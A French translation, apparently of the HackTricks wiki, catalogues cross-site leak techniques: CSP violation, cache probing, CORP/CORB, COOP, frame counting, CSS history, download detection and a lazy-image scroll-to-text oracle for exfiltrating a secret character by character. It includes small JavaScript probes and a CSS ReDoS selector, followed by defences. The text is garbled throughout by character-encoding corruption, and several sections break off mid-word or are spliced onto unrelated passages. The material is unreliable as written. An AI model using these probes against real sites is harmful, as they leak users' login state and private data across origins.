* **Plus d'infos** : [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **R√©sum√© :** Autoriser uniquement le site web de la victime dans le CSP si nous y acc√©dons essaie de rediriger vers un domaine diff√©rent, le CSP d√©clenchera une erreur d√©tectable.
* **Exemple de code** : [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak peut utiliser le CSP pour d√©tecter si un site cross-origin a √©t√© redirig√© vers un autre origine. Cette fuite peut d√©tecter la redirection, mais en plus, le domaine de la cible de la redirection est r√©v√©l√©. L'id√©e de base de cette attaque est de **permettre le domaine cible sur le site de l'attaquant**. Une fois une requ√™te √©mise vers le domaine cible, il **redirige** vers un domaine cross-origin. **CSP bloque** l'acc√®s √† celui-ci et cr√©e un **rapport de violation utilis√© comme technique de fuite**. Selon le navigateur, **ce rapport peut r√©v√©ler l'emplacement cible de la redirection**.\
Les navigateurs modernes n'indiqueront pas l'URL vers laquelle il a √©t√© redirig√©, mais vous pouvez toujours d√©tecter qu'une redirection cross-origin a √©t√© d√©clench√©e.

### Cache

* **M√©thodes d'inclusion** : Frames, Pop-ups
* **Diff√©rence d√©tectable** : Contenu de la Page
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **R√©sum√© :** Effacer le fichier du cache. Ouvre la page cible v√©rifie si le fichier est pr√©sent dans le cache.
* **Exemple de code :**

Les navigateurs peuvent utiliser un cache partag√© pour tous les sites web. Ind√©pendamment de leur origine, il est possible de d√©duire si une page cible a **demand√© un fichier sp√©cifique**.

Si une page charge une image uniquement si l'utilisateur est connect√©, vous pouvez **invalider** la **ressource** (pour qu'elle ne soit plus en cache si elle l'√©tait, voir plus d'infos liens), **effectuer une requ√™te** qui pourrait charger cette ressource et essayer de charger la ressource **avec une mauvaise requ√™te** (par exemple, en utilisant un en-t√™te referer trop long). Si le chargement de la ressource **n'a d√©clench√© aucune erreur**, c'est parce qu'elle √©tait **en cache**.

### Directive CSP

* **M√©thodes d'inclusion** : Frames
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **R√©sum√© :** Les directives d'en-t√™te CSP peuvent √™tre sond√©es avec l'attribut iframe CSP.
* **Exemple de code** : [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Une nouvelle fonctionnalit√© dans GC permet aux pages web de proposer un CSP en d√©finissant un attribut sur un √©l√©ment iframe. Les directives de politique sont transmises avec la requ√™te HTTP. Normalement, le contenu int√©gr√© doit explicitement permettre cela avec un en-t√™te HTTP, **sinon une page d'erreur est affich√©e**. Cependant, si l'iframe contient d√©j√† un CSP et que la nouvelle politique n'est pas plus stricte, la page s'affichera normalement.

Cela permet √† un attaquant de d√©tecter une directive CSP sp√©cifique d'une page crossorigin, s'il est possible de **d√©tecter la page d'erreur**. Bien que ce bug soit maintenant marqu√© comme corrig√©, nous avons trouv√© une **nouvelle technique de fuite qui peut d√©tecter la page d'erreur, car le probl√®me sous-jacent n'a jamais √©t√© r√©solu.**

### **CORP**

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **R√©sum√© :** Une ressource prot√©g√©e par CORP g√©n√®re une erreur lorsqu'elle est r√©cup√©r√©e.
* **Exemple de code** : [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

L'en-t√™te CORP est une fonctionnalit√© de s√©curit√© de la plateforme web relativement nouvelle qui, lorsqu'elle est d√©finie, **bloque les requ√™tes cross-origin no-cors pour la ressource donn√©e**. La pr√©sence de l'en-t√™te peut √™tre d√©tect√©e, car une ressource prot√©g√©e par CORP **g√©n√©rera une erreur lorsqu'elle est r√©cup√©r√©e**.

### CORB

* **M√©thodes d'inclusion** : √âl√©ments HTML
* **Diff√©rence d√©tectable** : En-t√™tes
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **R√©sum√©** : CORB peut permettre aux attaquants de d√©tecter quand l'en-t√™te **`nosniff`** est pr√©sent dans la requ√™te.
* **Exemple de code** : [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Consultez le lien pour plus d'informations sur l'attaque.

### Erreur CORS sur mauvaise configuration de la r√©flexion d'origine <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : En-t√™tes
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **R√©sum√©** : Si l'en-t√™te Origin est refl√©t√© dans l'en-t√™te `Access-Control-Allow-Origin`, il est possible de v√©rifier si une ressource est d√©j√† dans le cache.
* **Exemple de code** : [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Dans le cas o√π l'**en-t√™te Origin** est **refl√©t√©** dans l'en-t√™te `Access-Control-Allow-Origin`, un attaquant peut abuser de ce comportement pour essayer de **r√©cup√©rer** la **ressource** en mode **CORS**. Si une **erreur** **n'est pas** d√©clench√©e, cela signifie qu'elle a √©t√© **correctement r√©cup√©r√©e du web**, si une erreur est **d√©clench√©e**, c'est parce qu'elle a √©t√© **acc√©d√©e depuis le cache** (l'erreur appara√Æt parce que le cache enregistre une r√©ponse avec un en-t√™te CORS autorisant le domaine d'origine et non le domaine de l'attaquant)**.**\
Notez que si l'origine n'est pas refl√©t√©e mais qu'un joker est utilis√© (`Access-Control-Allow-Origin: *`), cela ne fonctionnera pas.

## Technique des Attributs Lisibles

### Redirection Fetch

* **M√©thodes d'inclusion** : Fetch API
* **Diff√©rence d√©tectable** : Code de Statut
* **Plus d'infos** : [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **R√©sum√© :** GC et SA permettent de v√©rifier le type de r√©ponse (opaque-redirect) apr√®s la fin de la redirection.
* **Exemple de code** : [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

En soumettant une requ√™te en utilisant l'API Fetch avec `redirect: "manual"` et d'autres param√®tres, il est possible de lire l'attribut `response.type` et si celui-ci est √©gal √† `opaqueredirect`, alors la r√©ponse √©tait une redirection.

### COOP

* **M√©thodes d'inclusion** : Pop-ups
* **Diff√©rence d√©tectable** : En-t√™te
* **Plus d'infos** : [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **R√©sum√© :** Les pages prot√©g√©es par COOP ne peuvent pas √™tre acc√©d√©es.
* **Exemple de code** : [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un attaquant peut r√©v√©ler si l'en-t√™te Cross-Origin Opener Policy (COOP) est disponible dans une r√©ponse HTTP cross-origin.

Les applications web peuvent d√©ployer l'en-t√™te de r√©ponse COOP pour emp√™cher d'autres sites web d'obtenir des r√©f√©rences de fen√™tre arbitraires √† l'application. Cependant, cet **en-t√™te peut facilement √™tre d√©tect√©** en essayant de lire la r√©f√©rence **`contentWindow`**. Si un site d√©ploie **COOP dans un √©tat seulement**, cette propri√©t√© (`opener`) est **ind√©finie**, **sinon** elle est **d√©finie**.

### Longueur Maximale de l'URL - C√¥t√© Serveur

* **M√©thodes d'inclusion** : Fetch API, √âl√©ments HTML
* **Diff√©rence d√©tectable** : Code de Statut / Contenu
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **R√©sum√© :** D√©tecter des diff√©rences dans les r√©ponses √† cause de la longueur de la r√©ponse de redirection qui pourrait √™tre trop grande, le serveur r√©pond avec une erreur et une alerte est g√©n√©r√©e.
* **Exemple de code** : [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si une redirection c√¥t√© serveur utilise **des donn√©es utilisateur √† l'int√©rieur de la redirection** et **des donn√©es suppl√©mentaires**. Il est possible de d√©tecter ce comportement car g√©n√©ralement les **serveurs** ont une **longueur de requ√™te limite**. Si les **donn√©es utilisateur** sont de **longueur - 1**, parce que la **redirection** utilise **ces donn√©es** et **ajoute** quelque chose **en plus**, cela d√©clenchera une **erreur d√©tectable via les √©v√©nements d'erreur**.

Si vous pouvez d'une mani√®re ou d'une autre d√©finir des cookies pour un utilisateur, vous pouvez √©galement r√©aliser cette attaque en **d√©finissant suffisamment de cookies** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) de sorte qu'avec la **taille de r√©ponse augment√©e** de la **r√©ponse correcte** une **erreur** est d√©clench√©e. Dans ce cas, rappelez-vous que si vous d√©clenchez cette requ√™te depuis un m√™me site, `<script>` enverra automatiquement les cookies (vous pouvez donc v√©rifier les erreurs).\
Un exemple de **cookie bomb + XS-Search** peut √™tre trouv√© dans la solution pr√©vue de ce writeup : [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou √™tre dans le m√™me contexte est g√©n√©ralement n√©cessaire pour ce type d'attaque.

### Longueur Maximale de l'URL - C√¥t√© Client

* **M√©thodes d'inclusion** : Pop-ups
* **Diff√©rence d√©tectable** : Code de Statut / Contenu
* **Plus d
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Comptage de Cadres

* **M√©thodes d'Inclusion** : Cadres, Pop-ups
* **Diff√©rence D√©tectable** : Contenu de la Page
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **R√©sum√©** : Lire le nombre de cadres (window.length).
* **Exemple de Code** : [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Compter le **nombre de cadres dans une page web** ouverte via `iframe` ou `window.open` peut aider √† identifier le **statut de l'utilisateur sur cette page**.\
De plus, si la page a toujours le m√™me nombre de cadres, v√©rifier **continuellement** le nombre de cadres peut aider √† identifier un **mod√®le** qui pourrait divulguer des informations.

Un exemple de cette technique est que dans Chrome, un **PDF** peut √™tre **d√©tect√©** avec le **comptage de cadres** car un `embed` est utilis√© en interne. Il existe des [Param√®tres d'URL Ouverts](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) qui permettent un certain contr√¥le sur le contenu tel que `zoom`, `view`, `page`, `toolbar` o√π cette technique pourrait √™tre int√©ressante.

### √âl√©ments HTML

* **M√©thodes d'Inclusion** : √âl√©ments HTML
* **Diff√©rence D√©tectable** : Contenu de la Page
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **R√©sum√©** : Lire la valeur divulgu√©e pour distinguer entre 2 √©tats possibles
* **Exemple de Code** : [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Certaines pages web peuvent **g√©n√©rer dynamiquement des fichiers m√©dias** en fonction des informations de l'utilisateur ou ajouter des filigranes qui changent la taille des m√©dias. Un attaquant peut utiliser les informations divulgu√©es par ces √©l√©ments HTML pour distinguer entre les √©tats possibles.

Certains √©l√©ments HTML divulgueront des informations aux origines crois√©es telles que le type de m√©dia qu'ils sont :

* [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) divulgue la `duration` du m√©dia et les temps `buffered`.
* [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) divulgue la `videoHeight` et `videoWidth` certains navigateurs peuvent √©galement avoir `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` et `webkitDecodedFrameCount`
* [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) divulgue les `totalVideoFrames`.
* [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) divulgue la `height` et `width` mais si l'image est invalide, elles seront 0 et [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) sera rejet√©.

### Propri√©t√© CSS

* **M√©thodes d'Inclusion** : √âl√©ments HTML
* **Diff√©rence D√©tectable** : Contenu de la Page
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **R√©sum√©** : D√©tecter le style du site web en fonction du statut de l'utilisateur.
* **Exemple de Code** : [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Les applications web peuvent changer le **style du site en fonction du statut de l'utilisateur**. Des fichiers CSS cross-origin peuvent √™tre int√©gr√©s sur la page de l'attaquant avec l'**√©l√©ment de lien HTML**, et les **r√®gles** seront **appliqu√©es** √† la page de l'attaquant. Si une page change dynamiquement ces r√®gles, un attaquant peut **d√©tecter** ces **diff√©rences** en fonction de l'√©tat de l'utilisateur.\
Comme technique de fuite, l'attaquant peut utiliser la m√©thode `window.getComputedStyle` pour **lire les propri√©t√©s CSS** d'un √©l√©ment HTML sp√©cifique. En cons√©quence, un attaquant peut lire des propri√©t√©s CSS arbitraires si l'√©l√©ment affect√© et le nom de la propri√©t√© sont connus.

### Historique CSS

* **M√©thodes d'Inclusion** : √âl√©ments HTML
* **Diff√©rence D√©tectable** : Contenu de la Page
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **R√©sum√©** : D√©tecter si le style `:visited` est appliqu√© √† une URL indiquant qu'elle a d√©j√† √©t√© visit√©e
* **Exemple de Code** : [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Selon [**ceci**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), cela ne fonctionne pas dans Chrome sans t√™te.
{% endhint %}

En utilisant le s√©lecteur CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited), il est possible d'appliquer un style diff√©rent pour les URL qui ont √©t√© visit√©es.\
Auparavant, il √©tait possible d'utiliser [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) pour d√©tecter cette diff√©rence mais maintenant les navigateurs emp√™chent cela en retournant toujours des valeurs comme si le lien avait √©t√© visit√© et en limitant quels styles peuvent √™tre appliqu√©s en utilisant le s√©lecteur.\
Il peut donc √™tre n√©cessaire de tromper l'utilisateur pour qu'il clique sur une zone affect√©e par le CSS, cela peut √™tre fait en utilisant [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode).\
Il existe √©galement des moyens de le faire sans interaction de l'utilisateur, comme en abusant des temps de rendu, cela fonctionne car il faut du temps pour peindre les liens d'une couleur diff√©rente.\
Un PoC a √©t√© fourni dans un rapport de chromium qui fonctionne en utilisant plusieurs liens pour augmenter la diff√©rence de temps.

### Fuite X-Frame de ContentDocument

* **M√©thodes d'Inclusion** : Cadres
* **Diff√©rence D√©tectable** : En-t√™tes
* **Plus d'infos** : [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **R√©sum√©** : Dans GC, lorsqu'une page n'est pas autoris√©e √† √™tre int√©gr√©e sur une page cross-origin √† cause de **X-Frame-Options, une page d'erreur est affich√©e**.
* **Exemple de Code** : [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Dans Chrome, lorsqu'une page n'est pas autoris√©e √† √™tre int√©gr√©e sur une page cross-origin, parce que l'en-t√™te **X-FrameOptions** (XFO) est d√©fini sur deny ou same-origin, une **page d'erreur est affich√©e √† la place**. Pour les objets, cette page d'erreur peut √™tre **d√©tect√©e en v√©rifiant la propri√©t√© `contentDocument`**. Normalement, cette propri√©t√© retourne null car l'acc√®s √† un document int√©gr√© cross-origin n'est pas autoris√©. Cependant, en raison du **rendu de la page d'erreur par Chrome**, un **objet document vide** est retourn√© √† la place. Cela ne fonctionne pas pour les iframes ou dans d'autres navigateurs. Les d√©veloppeurs peuvent oublier de d√©finir X-Frame-Options pour toutes les pages et surtout les pages d'erreur manquent souvent de cet en-t√™te. Comme technique de fuite, un attaquant peut √™tre capable de diff√©rencier entre diff√©rents √©tats d'utilisateur en v√©rifiant cela.

### D√©tection de T√©l√©chargement

* **M√©thodes d'Inclusion** : Cadres, Pop-ups
* **Diff√©rence D√©tectable** : En-t√™tes
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **R√©sum√©** : L'attaquant peut d√©tecter les t√©l√©chargements en utilisant des iframes. Si l'iframe est toujours accessible, le fichier a √©t√© t√©l√©charg√©.
* **Exemple de Code** : [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

L'en-t√™te `Content-Disposition` ([`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)) indique si le navigateur est cens√© t√©l√©charger le contenu ou l'afficher en ligne.

Si seul un utilisateur connect√© peut **acc√©der √† une page qui t√©l√©chargera un fichier** parce qu'il utilise l'en-t√™te. Il est possible de d√©tecter ce comportement.

#### Barre de T√©l√©chargement <a href="#download-bar" id="download-bar"></a>

Dans les navigateurs bas√©s sur Chromium, lorsqu'un fichier est t√©l√©charg√©, un aper√ßu du processus de t√©l√©chargement **appara√Æt dans une barre en bas**, int√©gr√©e √† la fen√™tre du navigateur. En **surveillant la hauteur de la fen√™tre**, les attaquants peuvent d√©tecter si la "barre de t√©l√©chargement" s'est ouverte.

#### Navigation de T√©l√©chargement (avec iframes) <a href="#download-navigation-with-iframes" id="download-navigation-with-iframes"></a>

Une autre fa√ßon de tester l'en-t√™te [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) est de **v√©rifier si une navigation a eu lieu**. Si un chargement de page provoque un t√©l√©chargement, cela ne d√©clenche pas de navigation et la **fen√™tre reste dans la m√™me origine**.

#### Navigation de T√©l√©chargement (sans iframes) <a href="#download-navigation-without-iframes" id="download-navigation-without-iframes"></a>

M√™me technique que la pr√©c√©dente mais en utilisant `window.open` au lieu d'iframes.

### Contournement du Cache HTTP Partitionn√© <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©thodes d'Inclusion** : Pop-ups
* **Diff√©rence D√©tectable** : Timing
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **R√©sum√©** : L'attaquant peut d√©tecter les t√©l√©chargements en utilisant des iframes. Si l'iframe est toujours accessible, le fichier a √©t√© t√©l√©charg√©.
* **Exemple de Code** : [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Voici pourquoi cette technique est int√©ressante : Chrome a maintenant une **partition de cache**, et la cl√© de cache de la page nouvellement ouverte est : `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, mais si j'ouvre une page ngrok et utilise fetch dedans, la cl√© de cache sera : `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **cl√© de cache est diff√©rente**, donc le cache ne peut pas √™tre partag√©. Vous pouvez trouver plus de d√©tails ici : [Gagner en s√©curit√© et en confidentialit√© en partitionnant le cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Commentaire de [**ici**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un site `example.com` inclut une ressource de `*.example.com/resource` alors cette ressource aura la **m√™me cl√© de cache** que si la ressource √©tait directement **demand√©e par une navigation de niveau sup√©rieur**. C'est parce que la cl√© de cache est constitu√©e du _eTLD+1_ de niveau sup√©rieur et du _eTLD+1_ du cadre.

Parce que l'acc√®s au cache est plus rapide que le chargement d'une ressource, il est possible d'essayer de changer l'emplacement d'une page et de l'annuler 20ms (par exemple) apr√®s. Si l'origine a √©t√© chang√©e apr√®s l'arr√™t, cela signifie que la ressource √©tait en cache.\
Ou pourrait simplement **envoyer des fetch √† la page potentiellement mise en cache et mesurer le temps que cela prend**.

### Redirection Manuelle <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©thodes d'Inclusion** : API Fetch
* **Diff√©rence D√©tectable** : Redirections
* **Plus d'infos** : [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
* **R√©sum√©** : Il est possible de savoir si une r√©ponse √† une requ√™te fetch est une redirection
* **Exemple de Code** :

![](<../.gitbook/assets/image (652).png>)

### Fetch avec AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©thodes d'Inclusion** : API Fetch
* **Diff√©rence D√©tectable** : Timing
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **R√©sum√©** : Il est possible d'essayer de charger une ressource et d'interrompre avant qu'elle ne soit charg√©e. Selon si une erreur est d√©clench√©e, la ressource √©tait ou n'√©tait pas en cache.
* **Exemple de Code** : [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

[**`AbortController`**](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) pourrait √™tre combin√© avec _**fetch**_ et _**setTimeout**_ pour √† la fois d√©tecter si la **ressource est en cache** et pour √©vincer une ressource sp√©cifique du cache du navigateur. Une caract√©ristique int√©ressante de cette technique est que la sonde se produit sans mettre en cache de nouveau contenu dans le processus.

### Pollution de Script

* **M√©thodes d'Inclusion** : √âl√©ments HTML (script)
* **Diff√©rence D√©tectable** : Contenu de la Page
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **R√©sum√©** : Lorsqu'un **script cross-origin** est inclus sur une page, il n'est **pas directement possible de lire** son contenu. Cependant, si un script
```html
<img src=/something loading=lazy >
```
Par cons√©quent, ce que vous pouvez faire est **d'ajouter beaucoup de caract√®res inutiles** (par exemple **des milliers de "W"**) pour **remplir la page web avant le secret ou ajouter quelque chose comme** `<br><canvas height="1850px"></canvas><br>.`\
Ensuite, si par exemple notre **injection appara√Æt avant le drapeau**, l'**image** serait **charg√©e**, mais si elle appara√Æt **apr√®s** le **drapeau**, le drapeau + les caract√®res inutiles **emp√™cheront son chargement** (vous devrez jouer avec la quantit√© de caract√®res inutiles √† placer). C'est ce qui s'est pass√© dans [**ce compte-rendu**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Une autre option serait d'utiliser le **scroll-to-text-fragment** si autoris√© :

#### Scroll-to-text-fragment

Cependant, vous faites en sorte que le **bot acc√®de √† la page** avec quelque chose comme
```
#:~:text=SECR
```
La page web sera donc quelque chose comme : **`https://victim.com/post.html#:~:text=SECR`**

O√π post.html contient les caract√®res ind√©sirables de l'attaquant et une image en chargement diff√©r√©, puis le secret du bot est ajout√©.

Ce que ce texte va faire, c'est forcer le bot √† acc√©der √† n'importe quel texte de la page qui contient le texte `SECR`. Comme ce texte est le secret et qu'il est juste **en dessous de l'image**, **l'image ne se chargera que si le secret devin√© est correct**. Vous avez donc votre oracle pour **exfiltrer le secret caract√®re par caract√®re**.

Voici un exemple de code pour exploiter cela : [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Chargement diff√©r√© d'image bas√© sur le temps

S'il **n'est pas possible de charger une image externe** qui pourrait indiquer √† l'attaquant que l'image a √©t√© charg√©e, une autre option serait d'essayer de **deviner le caract√®re plusieurs fois et de mesurer cela**. Si l'image est charg√©e, toutes les requ√™tes prendront plus de temps que si l'image n'est pas charg√©e. C'est ce qui a √©t√© utilis√© dans la [**solution de ce writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **r√©sum√©e ici :**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Si `jQuery(location.hash)` est utilis√©, il est possible de d√©terminer via le temps de r√©ponse **si du contenu HTML existe**, cela est d√ª au fait que si le s√©lecteur `main[id='site-main']` ne correspond pas, il n'est pas n√©cessaire de v√©rifier le reste des **s√©lecteurs** :
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Injection CSS

{% content-ref url="xs-search/css-injection/" %}
[injection-css](xs-search/css-injection/)
{% endcontent-ref %}

## D√©fenses

Dans cette section, vous pouvez trouver une partie des att√©nuations recommand√©es dans [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), cependant, il y a plus d'att√©nuations dans chaque section du wiki [https://xsleaks.dev/](https://xsleaks.dev/). Consultez ce site pour plus d'informations sur comment se prot√©ger contre ces techniques.

### Att√©nuations de la M√©thode d'Inclusion

* **√âl√©ments HTML**. Ils peuvent utiliser l'en-t√™te **CORP pour contr√¥ler si les pages peuvent int√©grer une ressource**. CORP peut √™tre d√©fini soit √† same-origin soit √† same-site et bloque toute demande cross-origin ou cross-site √† cette ressource. Sur le **site client**, les navigateurs bas√©s sur Chromium utilisent l'algorithme **CORB** pour d√©cider si les demandes de ressources cross-origin doivent √™tre autoris√©es ou refus√©es.
* **Cadres**. La principale d√©fense pour **emp√™cher les √©l√©ments iframe** de charger des ressources HTML est l'utilisation de **X-Frame-Options**. Alternativement, la **directive CSP frame-ancestors** peut obtenir un r√©sultat similaire. Si l'int√©gration est refus√©e, la m√©thode d'inclusion ne peut pas d√©tecter de diff√©rence dans les r√©ponses.
